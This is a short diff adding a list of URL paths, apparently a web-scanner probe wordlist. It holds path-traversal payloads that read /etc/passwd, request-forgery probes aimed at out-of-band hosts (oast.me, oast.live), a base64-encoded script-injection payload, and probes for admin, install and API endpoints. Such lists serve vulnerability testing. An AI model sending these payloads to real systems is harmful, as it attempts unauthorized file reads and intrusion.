@@ -1,0 +1,12 @@
+/index.php?page=&action=edit&f1=.//./\\.//./\\.//./\\.//./\\.//./\\.//./etc/passwd&restore=1
+/index.php?download=/etc/passwd
+/cors_proxy/https://oast.me/
+/api/change_setting?second_value=no_reload&disable_sequence=true&value=../../../../../../../etc/passwd
+/index.php?s=example
+/unified-console.html
+/install
+/umbraco/management/api/v1/server/status
+/ajax-api/2.0/preview/mlflow/experiments/get?experiment_id=0
+/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+/static/css//../../../../../../../../etc/passwd
+/render.html?url=https://oast.live
